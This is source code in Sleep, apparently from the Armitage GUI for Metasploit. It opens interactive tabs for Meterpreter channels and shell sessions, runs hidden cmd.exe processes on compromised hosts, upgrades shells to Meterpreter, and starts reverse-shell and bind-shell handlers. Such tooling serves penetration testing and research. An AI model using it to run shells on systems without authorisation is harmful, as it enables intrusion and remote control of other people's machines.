#
# creates a tab for interacting with a meterpreter channel...
#

import console.*; 
import armitage.*;

import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

global('%shells $ashell $achannel %maxq');

%handlers["execute"] = {
	this('$command $channel $pid');

	if ($0 eq "execute") {
		if ($2 ismatch "execute -H -c -f (.*?)") {
			($command) = matched();
		}
		else if ($2 ismatch "execute -H -f (.*?) -c") {
			($command) = matched();
		}
	}
	else if ($0 eq "update" && $2 ismatch 'Channel (\d+) created.') {
		($channel) = matched();
	}
	else if ($0 eq "update" && $2 ismatch 'Process (\d+) created.') {
		($pid) = matched();
	}
	else if ($0 eq "end") {
		local('$console');

		$console = [new Console];

		%shells[$1][$channel] = $console;

		[[$console getInput] addActionListener: lambda({
			if (-exists "command.txt") {
				warn("Dropping command, old one not sent yet");
				return;
			}
			
			local('$text $handle');
			$text = [[$console getInput] getText];
			[[$console getInput] setText: ""];

			$handle = openf(">command.txt");
			writeb($handle, "$text $+ \r\n");
			closef($handle);

			m_cmd($sid, "write -f \"" . strrep(getFileProper("command.txt"), "\\", "\\\\") . "\" $channel");
		}, $sid => $1, \$console, \$channel)];

		[$frame addTab: "$command $pid $+ @ $+ $1", $console, lambda({
			m_cmd($sid, "close $channel");
			m_cmd($sid, "kill $pid");
			%shells[$sid][$channel] = $null;
		}, $sid => $1, \$channel, \$console, \$pid)];

		m_cmd($1, "read $channel");
	}
};

%handlers["write"] = {
	this('$channel $ashell');

	if ($0 eq "execute" && $2 ismatch 'write -f .*? (\d+)') {
		($channel) = matched();
		$ashell = %shells[$1][$channel];
	}
	else if ($0 eq "update" && $2 ismatch '\[\*]\ Wrote \d+ bytes to channel (\d+)\.') {
		deleteFile("command.txt");

		local('$channel $ashell');
		($channel) = matched();
		sleep(100);
		m_cmd($1, "read $channel");
	}
	else if ($0 eq "update" && $2 ismatch '\[\-\] .*?' && $ashell !is $null) {
		[$ashell append: "\n $+ $2"];
		$ashell = $null;
	}
};

%handlers["read"] = {
	if ($0 eq "update") {
		if ($2 ismatch 'Read \d+ bytes from (\d+):') {
			local('$channel');
			($channel) = matched();
			$ashell = %shells[$1][$channel];
			$achannel = $channel;
		}
	}
	else if ($0 eq "end" && $ashell !is $null) {
		local('$v $count');
		$v = split("\n", [$2 trim]);
		$count = size($v);
		shift($v);
	
		while ($v[0] eq "") {
			shift($v);
		}
		#$v = substr($v, join("\n", $v));
		[$ashell append: [$ashell getPromptText] . join("\n", $v)];
		$ashell = $null;

		if (strlen($2) >= 1024 && strlen($2) >= %maxq[$achannel]) {
			if (strlen($2) > %maxq[$achannel]) {
				%maxq[$achannel] = strlen($2) - (strlen($2) % 1000);
			}
			sleep(250);
			m_cmd($1, "read $achannel");
		}
	}
};

sub createShellTab {
	m_cmd($1, "execute -H -c -f cmd.exe");
}

sub createCommandTab {
	m_cmd($1, "execute -H -c -f $2");
}

sub shellPopup {
        local('$popup');
        $popup = [new JPopupMenu];
        showShellMenu($popup, \$session, \$sid);
        [$popup show: [$2 getSource], [$2 getX], [$2 getY]];
}

sub showShellMenu {
	item($1, "Interact", 'I', lambda(&createShellSessionTab, \$sid, \$session));
	item($1, "Meterpreter...", 'M', lambda({
		call($client, "session.shell_upgrade", $sid, $MY_ADDRESS, randomPort());
	}, \$sid));
	separator($1);
	item($1, "Disconnect", 'D', lambda({
		call($client, "session.stop", $sid);
	}, \$sid));
}

sub createShellSessionTab {
	local('$console $thread');
	$console = [new Console];
	[$console setDefaultPrompt: '$ '];
        [$console setPopupMenu: lambda(&shellPopup, \$session, \$sid)];
	$thread = [new ConsoleClient: $console, $client, "session.shell_read", "session.shell_write", "session.stop", $sid, 0];
        [$frame addTab: "Shell $sid", $console, $null];
}

sub listen_for_shellz {
        local('$dialog $port $type $panel $button');
        $dialog = dialog("Create Listener", 640, 480);

        $port = [new JTextField: randomPort() + "", 6];
        $type = [new JComboBox: @("shell", "meterpreter")];

        $panel = [new JPanel];
        [$panel setLayout: [new GridLayout: 2, 1]];

        [$panel add: label_for("Port: ", 100, $port)];
        [$panel add: label_for("Type: ", 100, $type)];

        $button = [new JButton: "Start Listener"];
	[$button addActionListener: lambda({
		local('%options');
		%options["PAYLOAD"] = iff([$type getSelectedItem] eq "shell", "generic/shell_reverse_tcp", "windows/meterpreter/reverse_tcp");
		%options["LPORT"] = [$port getText];
		call($client, "module.execute", "exploit", "multi/handler", %options);
		[$dialog setVisible: 0];
	}, \$dialog, \$port, \$type)];

        [$dialog add: $panel, [BorderLayout CENTER]];
        [$dialog add: center($button), [BorderLayout SOUTH]];
        [$dialog pack];

        [$dialog setVisible: 1];
}


sub connect_for_shellz {
        local('$dialog $host $port $type $panel $button');
        $dialog = dialog("Connect", 640, 480);

	$host = [new JTextField: "127.0.0.1", 20];
        $port = [new JTextField: randomPort() + "", 6];
        $type = [new JComboBox: @("shell", "meterpreter")];

        $panel = [new JPanel];
        [$panel setLayout: [new GridLayout: 3, 1]];

	[$panel add: label_for("Host: ", 100, $host)];
        [$panel add: label_for("Port: ", 100, $port)];
        [$panel add: label_for("Type: ", 100, $type)];

        $button = [new JButton: "Connect"];
	[$button addActionListener: lambda({
		local('%options');
		%options["PAYLOAD"] = iff([$type getSelectedItem] eq "shell", "generic/shell_bind_tcp", "windows/meterpreter/bind_tcp");
		%options["LPORT"] = [$port getText];
		%options["RHOST"] = [$host getText];
		warn(%options);
		warn(call($client, "module.execute", "exploit", "multi/handler", %options));
		[$dialog setVisible: 0];
	}, \$dialog, \$port, \$type, \$host)];

        [$dialog add: $panel, [BorderLayout CENTER]];
        [$dialog add: center($button), [BorderLayout SOUTH]];
        [$dialog pack];

        [$dialog setVisible: 1];
}

